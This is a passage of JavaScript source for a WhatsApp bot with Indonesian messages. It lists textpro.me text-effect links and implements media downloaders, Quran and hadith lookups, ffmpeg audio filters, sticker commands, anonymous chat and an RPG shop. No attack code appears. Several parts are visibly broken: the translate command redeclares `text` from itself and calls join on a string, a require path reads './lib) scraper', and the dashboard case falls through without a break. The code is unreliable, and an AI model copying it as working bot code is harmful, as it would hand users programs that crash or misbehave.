    "url": "https://textpro.me/metal-dark-gold-text-effect-online-939.html"
  },
  {
    "title": "Metallic",
    "url": "https://textpro.me/create-a-metallic-text-effect-free-online-1041.html"
  },
  {
    "title": "MetalPurpleDual",
    "url": "https://textpro.me/metal-purple-dual-effect-973.html"
  },
  {
    "title": "MetalRainbow",
    "url": "https://textpro.me/metal-rainbow-text-effect-854.html"
  },
  {
    "title": "Minion3D",
    "url": "https://textpro.me/minion-text-effect-3d-online-978.html"
  },
  {
    "title": "NaturalLeaves",
    "url": "https://textpro.me/natural-leaves-text-effect-931.html"
  },
  {
    "title": "Neondevil",
    "url": "https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html"
  },
  {
    "title": "Neon1",
    "url": "https://textpro.me/neon-text-effect-online-963.html"
  },
  {
    "title": "Neon2",
    "url": "https://textpro.me/neon-text-effect-online-879.html"
  },
  {
    "title": "NeonLight1",
    "url": "https://textpro.me/neon-light-text-effect-online-882.html"
  },
  {
    "title": "NeonLightGalaxy",
    "url": "https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html"
  },
  {
    "title": "Newyear1",
    "url": "https://textpro.me/new-year-cards-3d-by-name-960.html"
  },
  {
    "title": "Newyear2",
    "url": "https://textpro.me/happ-new-year-card-firework-gif-959.html"
  },
  {
    "title": "NinjaLogo",
    "url": "https://textpro.me/create-ninja-logo-online-935.html"
  },
  {
    "title": "OrangeGlass",
    "url": "https://textpro.me/orange-glass-text-effect-911.html"
  },
  {
    "title": "OrangeJewelry",
    "url": "https://textpro.me/orange-jewelry-text-effect-847.html"
  },
  {
    "title": "papercut1",
    "url": "https://textpro.me/create-art-paper-cut-text-effect-online-1022.html"
  },
  {
    "title": "PeridotStone",
    "url": "https://textpro.me/peridot-stone-text-effect-916.html"
  },
  {
    "title": "PinkBalloon",
    "url": "https://textpro.me/pink-foil-balloon-text-effect-926.html"
  },
  {
    "title": "PinkJewelry",
    "url": "https://textpro.me/pink-sparkling-jewelry-text-effect-899.html"
  },
  {
    "title": "PinkGlitter",
    "url": "https://textpro.me/pink-glitter-text-effect-839.html"
  },
  {
    "title": "PinkCandy",
    "url": "https://textpro.me/pink-candy-text-effect-832.html"
  },
  {
    "title": "PlasticBagDrug",
    "url": "https://textpro.me/plastic-bag-drug-text-effect-867.html"
  },
  {
    "title": "PurpleBalloon",
    "url": "https://textpro.me/purple-foil-balloon-text-effect-927.html"
  },
  {
    "title": "PurpleJewelry1",
    "url": "https://textpro.me/purple-sparkling-jewelry-text-effect-896.html"
  },
  {
    "title": "PurpleJewelry2",
    "url": "https://textpro.me/purple-jewelry-text-effect-848.html"
  },
  {
    "title": "PurpleGlitter",
    "url": "https://textpro.me/purple-glitter-text-effect-840.html"
  },
  {
    "title": "PurpleGem",
    "url": "https://textpro.me/-gem-text-effect-853.html"
  },
  {
    "title": "PurpleGlass1",
    "url": "https://textpro.me/purple-glass-text-effect-online-892.html"
  },
  {
    "title": "PurpleGlass2",
    "url": "https://textpro.me/purple-glass-text-effect-912.html"
  },
  {
    "title": "PurpleShinyGlass",
    "url": "https://textpro.me/purple-shiny-glass-text-effect-906.html"
  },
  {
    "title": "PornhubLogo",
    "url": "https://textpro.me/pornhub-style-logo-online-generator-free-977.html"
  },
  {
    "title": "RainbowEqualizer",
    "url": "https://textpro.me/rainbow-equalizer-text-effect-902.html"
  },
  {
    "title": "Realisticvintage",
    "url": "https://textpro.me/create-realistic-vintage-style-light-bulb-1000.html"
  },
  {
    "title": "Realisticcloud",
    "url": "https://textpro.me/create-realistic-cloud-text-effect-online-free-999.html"
  },
  {
    "title": "RedBalloon",
    "url": "https://textpro.me/red-foil-balloon-text-effect-928.html"
  },
  {
    "title": "RedGlass",
    "url": "https://textpro.me/red-glass-text-effect-907.html"
  },
  {
    "title": "RedJewelry1",
    "url": "https://textpro.me/red-sparkling-jewelry-text-effect-894.html"
  },
  {
    "title": "RedJewelry2",
    "url": "https://textpro.me/red-jewelry-text-effect-849.html"
  },
  {
    "title": "Robot",
    "url": "https://textpro.me/robot-r2-d2-text-effect-903.html"
  },
  {
    "title": "RoadWarning",
    "url": "https://textpro.me/road-warning-text-effect-878.html"
  },
  {
    "title": "Rock",
    "url": "https://textpro.me/rock-text-effect-online-915.html"
  },
  {
    "title": "RustyMetal",
    "url": "https://textpro.me/rusty-metal-text-effect-860.html"
  },
  {
    "title": "SandSummerBeach",
    "url": "https://textpro.me/write-in-sand-summer-beach-free-online-991.html"
  },
  {
    "title": "SandWriting",
    "url": "https://textpro.me/sand-writing-text-effect-online-990.html"
  },
  {
    "title": "Sciencefiction",
    "url": "https://textpro.me/create-science-fiction-text-effect-online-free-1038.html"
  },
  {
    "title": "SCIFi",
    "url": "https://textpro.me/sci-fi-text-effect-855.html"
  },
  {
    "title": "ShinyMetal",
    "url": "https://textpro.me/shiny-metal-text-effect-852.html"
  },
  {
    "title": "SilverJewelry",
    "url": "https://textpro.me/silver-jewelry-text-effect-850.html"
  },
  {
    "title": "SilverGlitter",
    "url": "https://textpro.me/silver-glitter-text-effect-837.html"
  },
  {
    "title": "Sketch",
    "url": "https://textpro.me/create-a-sketch-text-effect-online-1044.html"
  },
  {
    "title": "Skeleton",
    "url": "https://textpro.me/skeleton-text-effect-online-929.html"
  },
  {
    "title": "Snowwinterholidays",
    "url": "https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html"
  },
  {
    "title": "Space1",
    "url": "https://textpro.me/create-space-text-effects-online-free-1042.html"
  },
  {
    "title": "Space3D",
    "url": "https://textpro.me/create-space-3d-text-effect-online-985.html"
  },
  {
    "title": "Strawberry",
    "url": "https://textpro.me/strawberry-text-effect-online-889.html"
  },
  {
    "title": "Stone1",
    "url": "https://textpro.me/create-a-stone-text-effect-online-982.html"
  },
  {
    "title": "Steel",
    "url": "https://textpro.me/steel-text-effect-online-921.html"
  },
  {
    "title": "Summerysand",
    "url": "https://textpro.me/create-a-summery-sand-writing-text-effect-988.html"
  },
  {
    "title": "Thunder1",
    "url": "https://textpro.me/online-thunder-text-effect-generator-1031.html"
  },
    {
    "title": "Thunder2",
    "url": "https://textpro.me/create-thunder-text-effect-online-881.html"
  },
  {
    "title": "Toxic",
    "url": "https://textpro.me/toxic-text-effect-online-901.html"
  },
  {
    "title": "Transformer",
    "url": "https://textpro.me/create-a-transformer-text-effect-online-1035.html"
  },
  {
    "title": "UltraGloss",
    "url": "https://textpro.me/ultra-gloss-text-effect-online-920.html"
  },
  {
    "title": "Watercolor",
    "url": "https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html"
  },
  {
    "title": "Wicker",
    "url": "https://textpro.me/wicker-text-effect-online-932.html"
  },
  {
    "title": "WolfLogo1",
    "url": "https://textpro.me/create-wolf-logo-galaxy-online-936.html"
  },
  {
    "title": "WolfLogo2",
    "url": "https://textpro.me/create-wolf-logo-black-white-937.html"
  },
  {
    "title": "Wonderfulgraffiti",
    "url": "https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html"
  },
  {
    "title": "Wood",
    "url": "https://textpro.me/wood-text-effect-856.html"
  },
  {
    "title": "YellowGlass",
    "url": "https://textpro.me/yellow-glass-text-effect-913.html"
  },
  {
    "title": "YellowJewelry",
    "url": "https://textpro.me/yellow-jewelry-text-effect-851.html"
  },
]
 for ( let i of effects) {
cuks.push({
title: i.title, rowId: `${prefix}tpget ${i.url}|${text}`, description: ``})
                }
const sections = [
{
title: "Ytsearch",
rows: cuks
}
]
const listMessage = {
text: `create by ©lui`,
footer: `textpro maker by lui scrape from exfarr-api`,
title: "",
buttonText: "list effects",
sections
}
hisoka.sendMessage(m.chat, listMessage, {quoted:fgif})
}
break
case prefix+'tpget': {
let [link, judul] = text.split`|`
let tpx = await expar.maker.textpro(`${link}`, `${judul}`)
hisoka.sendMessage(m.chat, { image: tpx.result, caption: `succes!` }, { quoted: m })
}
break            
case prefix+'sticktelegram': case prefix+'stiktele': case prefix+'stikertelegram': {
if (!text) throw `Masukan judul stiker nya!`
                hisoka.sendMessage(m.chat, waitv2, { quoted: m })

let cuaks = await bochil.stickerTelegram(text)
let brush = pickRandom(cuaks)
hisoka.sendMessage(m.chat, { text: `Data berhasil Didapatkan!\n\nNamepack: ${brush.title}\nJumlah Sticker: ${brush.stickers.length}\nLink: ${brush.link}\n\n_Tunggu Sticker Akan Segera di kirim_`})
for (let i of brush.stickers) {
 hisoka.sendImageAsSticker(m.chat, await getBuffer(i), m, { packname: global.packname, author: global.author })
}
}
break
	        case prefix+'instagram': case prefix+'ig': case prefix+'igdl': {
                if (!text) throw 'No Query Url!'
                                hisoka.sendMessage(m.chat, waitv2, { quoted: m })                                
                let ck = await bochil.instagramdlv2(text)                
                hisoka.sendFileUrl(m.chat, ck[0].url, `Succes!`, m)
            }
            break
            case prefix+'artimimpi': {
            if (!text) throw `Masukan Mimpi mu!`
            let tuex = await bochil.artimimpi(text)
            hisoka.sendMessage(m.chat, {
text: `${tuex[0]}`, contextInfo: { mentionedJid: [m.sender],
externalAdReply: {
title: `Hasil Pencarian Dari ${text}`,
body: ``,
mediaType: 1,                        
thumbnail: await getBuffer('https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=arti%20mimpi'),
renderLargerThumbnail: true,                                             
sourceUrl: ``,
mediaUrl: 'https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=arti%20mimpi'
}
}
}, { quoted: m })       
             }
             break
case 'db': case 'dashboard': {
  let stats = Object.entries(db.data.stats).map(([key, val]) => {
    let name = Array.isArray(features[key]?.help) ? features[key]?.help?.join(' & ') : features[key]?.help || key 
    if (/exec/.test(name)) return
    return { name, ...val }
  })
  stats = stats.sort((a, b) => b.total - a.total)
  let txt = stats.slice(0, 10).map(({ name, total, last }, idx) => {
    return `${idx + 1}. ◦ *Command* : ${name}\n     ◦ *Hit* : *${total}*\n     ◦ *Last Used:* ${require("moment")(last).fromNow()}`
  }).join`\n`
  hisoka.sendMessage(m.chat, { text: '乂 *D A S H B O A R D*\n\n' + txt }, { quoted: m })
}
case prefix+'translate': case prefix+'tr': {
if (!text) throw `Masukan teks!`
const translate = require('translate-google-api')
const defaultLang = 'en'
const tld = 'cn'
    let err = `
Contoh:
${prefix + command} <lang> [text]
${prefix + command} id your messages

Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
`.trim()

    let lang = text
    let text = text.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = text.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text

    let result
    try {
        result = await translate(`${text}`, {
            tld,
            to: lang,
        })
    } catch (e) {
        result = await translate(`${text}`, {
            tld,
            to: defaultLang,
        })
        throw err
    } finally {
        m.reply(result[0])
    }

}   
break                              
            case prefix+'wikipedia': {
            if (!text) throw 'Masukan Query teks!'
            let tots = await yuzzu.wiki(text)
            hisoka.sendMessage(m.chat, {
text: `${tots[0].wiki}`, contextInfo: { mentionedJid: [m.sender],
externalAdReply: {
title: `Hasil Pencarian Dari ${text}`,
body: ``,
mediaType: 1,                        
thumbnail: await getBuffer(tots[0].thumb),
renderLargerThumbnail: true,                                             
sourceUrl: ``,
mediaUrl: `${tots[0].thumb}`,
}
}
}, { quoted: m })       
             }
             break                    
            case prefix+'lirik': case prefix+'lyrics': {
            if (!text) throw 'Masukan Judul Lagunya!'
            let termux = await hxz.lirik(text)   
hisoka.sendMessage(m.chat, {
text: `${termux.lirik}`, contextInfo: { mentionedJid: [m.sender],
externalAdReply: {
title: `Hasil Pencarian lirik Dari judul ${text}`,
body: ``,
mediaType: 1,                        
thumbnail: await getBuffer(termux.thumb),
renderLargerThumbnail: true,                                             
sourceUrl: ``,
mediaUrl: `${termux.thumb}`,
}
}
}, { quoted: m })       
             }
             break                    
            case prefix+'soundcloud': case prefix+'scdl': {
                if (!text) throw 'No Query Title'
                                hisoka.sendMessage(m.chat, waitv2, { quoted: m })

                let anu = await fetchJson(api('zenz', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
                let msg = await hisoka.sendImage(m.chat, anu.result.thumb, `⭔ Title : ${anu.result.title}\n⭔ Url : ${isUrl(text)[0]}`)
                hisoka.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
            }
            break
	        case prefix+'twitdl': case prefix+'twitter': {
                if (!text) throw 'Masukkan Query Link!'
                let fb = await bochil.twitterdl(text)
                let trumin = []
                for (let i of fb) {
trumin.push({
title: i.type, rowId: `${prefix}fileget ${i.url}`, description: `isVideo: ${i.isVideo} / Qualitu: ${i.quality}`})
                }
const sections = [
{
title: "Tw DL",
rows: trumin
}
]
const listMessage = {
text: `Twitter Downloader`,
footer: `Simple whatsapp Bot`,
title: "",
buttonText: `Ditemukan ${fb.length} Hasil`,
sections
}
hisoka.sendMessage(m.chat, listMessage, {quoted:m})
                  }
            break
            case prefix+'twittermp3': case prefix+'twitteraudio': {
                if (!text) throw 'Masukkan Query Link!'
                                hisoka.sendMessage(m.chat, waitv2, { quoted: m })

                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twitter ${text}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
		    image: { url: anu.result.thumb },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 4
                }
                let msg = await hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
                hisoka.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: msg })
            }
            break
case prefix+'fileget': {
if (!text) throw 'Turu'
hisoka.sendFileUrl(m.chat, text, 'Succes!', m)
}
break
	        case prefix+'fbdl': case prefix+'fb': case prefix+'facebook': {
                if (!text) throw 'Masukkan Query Link!'
                let fb = await bochil.facebookdl(text)
                let trumin = []
                for (let i of fb.result) {
trumin.push({
title: i.ext, rowId: `${prefix}fileget ${i.url}`, description: `isVideo: ${i.isVideo} / isAudio: ${i.isAudio}`})
                }
const sections = [
{
title: "Ytsearch",
rows: trumin
}
]
const listMessage = {
text: `Fb Downloader`,
footer: `Simple whatsapp Bot`,
title: "",
buttonText: `Ditemukan ${fb.result.length} Hasil`,
sections
}
hisoka.sendMessage(m.chat, listMessage, {quoted:m})
                  }
            break
	        case prefix+'pindl': case prefix+'pinterestdl': {
                if (!text) throw 'Masukkan Query Link!'
                                hisoka.sendMessage(m.chat, waitv2, { quoted: m })

                let anu = await fetchJson(api('zenz', '/api/downloader/pinterestdl', { url: text }, 'apikey'))
                hisoka.sendMessage(m.chat, { video: { url: anu.result }, caption: `Download From ${text}` }, { quoted: m })
            }
            break
            case prefix+'umma': case prefix+'ummadl': {
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
⭔ Title : ${anu.title}
⭔ Author : ${anu.author.name}
⭔ Like : ${anu.like}
⭔ Caption : ${anu.caption}
⭔ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: hisoka.user.name,
			buttons,
			headerType: 4
		    }
		    hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        hisoka.sendMessage(m.chat, { image: { url }, caption: `⭔ Title : ${anu.title}\n⭔ Author : ${anu.author.name}\n⭔ Like : ${anu.like}\n⭔ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case prefix+'ringtone': {
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		hisoka.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
		case prefix+'iqra': {
		oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
		if (!text) throw oh
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		hisoka.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
		}
		break
		case prefix+'hadits': case prefix+'hadis': case prefix+'hadist': {
		if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
tirmidzi
1 - 3891
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
		if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
		try {
		let res = await fetchJson(`https://fatiharridho.herokuapp.com/api/islamic/hadits?list=${args[0]}`)
		let { number, arab, id } = res.result.find(v => v.number == args[1])
		m.reply(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		m.reply(`Hadis tidak ditemukan !`)
		}
		}
		break
		case prefix+'alquran': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		hisoka.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
		}
		break
		case prefix+'tafsirsurah': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		}
		break
		   case prefix+'bass': case prefix+'blown': case prefix+'deep': case prefix+'earrape': case prefix+'fast': case prefix+'fat': case prefix+'nightcore': case prefix+'reverse': case prefix+'robot': case prefix+'slow': case prefix+'smooth': case prefix+'tupai':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                                hisoka.sendMessage(m.chat, waitv2, { quoted: m })

                let media = await hisoka.downloadAndSaveMediaMessage(qmsg)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                hisoka.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case prefix+'setcmd': {
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case prefix+'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case prefix+'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                hisoka.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case prefix+'lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case prefix+'addmsg': {
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case prefix+'getmsg': {
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                hisoka.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case prefix+'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case prefix+'delmsg': case prefix+'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
	    case prefix+'anonymous': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                hisoka.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await hisoka.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, hisoka.user.name, m)
            }
			break
            case prefix+'keluar': case prefix+'leave': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                let room = Object.values(db.data.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await hisoka.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete db.data.anonymous[room.id]
                if (command === 'leave') break
            }
            case prefix+'mulai': case prefix+'start': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                if (Object.values(db.data.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, hisoka.user.name, m)
                    throw false
                }
                let room = Object.values(db.data.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, hisoka.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await hisoka.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, hisoka.user.name, m)
                } else {
                    let id = + new Date
                    db.data.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, hisoka.user.name, m)
                }
                break
            }
            case prefix+'shop': {
            const potion = 500
const Sgold = 3000
const Bgold = 6000
const Bstring = 500
const Sstring = 200
const Bbatu = 500
const Sbatu = 200
const Bkayu = 500
const Skayu = 200
const Sarloji = 9000000
const Biron = 800
const Siron = 700
const Spotion = 150 
const Bdiamond = 900
const Sdiamond = 750
const Bcommon = 200
const Scommon = 20
const Suncommon = 100
const Buncommon = 600
const Bmythic = 2500 
const Smythic = 900
const Blegendary = 7500 
const Slegendary = 3000
const Bsampah = 10
const Ssampah = 2
const Bjagung = 20
const Bjeruk = 20
const Bapel = 20
const Bmangga = 20
const Banggur = 20
const Sjagung = 100
const Sjeruk = 100
const Sapel = 100
const Smangga = 100
const Sanggur = 100
const Baqua = 50
const Bumpan = 150
const Bkucing = 5
const Banjing = 5
const Bkuda = 7
const Bfox = 10
const Bserigala = 10
const Bphonix = 20
const Bcentaur = 35
const Bgriffin = 35
const Bnaga = 1000
const Bfood = 500
const Bpet = 1500
const Spet = 750
    const _armor = global.db.data.users[m.sender].armor
    const armor = (_armor == 0 ? 20000 : '' || _armor == 1 ? 49999 : '' || _armor == 2 ? 99999 : '' || _armor == 3 ? 149999 : '' || _armor == 4 ? 299999 : '')
    const uparmor = (_armor == 0 ? 'Kamu belum mempunyai Armor' : '' || _armor == 1 ? 135 : '' || _armor == 2 ? 175 : '' || _armor== 3 ? 250 : '' || _armor == 4 ? 320 : '')
    const _pancing = global.db.data.users[m.sender].pancing
    const pancing = (_pancing == 0 ? 1700 : '' || _pancing == 1 ? 3000 : '' || _pancing == 2 ? 5500 : '' || _pancing == 3 ? 10500 : '')
    const uppancing = (_pancing == 0 ? 0 : '' || _pancing == 1 ? 25 : '' || _pancing == 2 ? 55 : '' || _pancing == 3 ? 75 : '')
    const durfishingrod = (_pancing == 0 ? 0 : '' || _pancing == 1 ? 50 : '' || _pancing == 2 ? 70 : '' || _pancing == 3 ? 100 : '')
    const refishingrod = (_pancing == 0 ? 0 : '' || _pancing == 1 ? 10 : '' || _pancing == 2 ? 35 : '' || _pancing == 3 ? 65 : '')
    const drefishingrod = (_pancing == 0 ? 0 : '' || _pancing == 1 ? 10 : '' || _pancing == 2 ? 25 : '' || _pancing == 3 ? 40 : '')
    
    const _pickaxe = global.db.data.users[m.sender].pickaxe
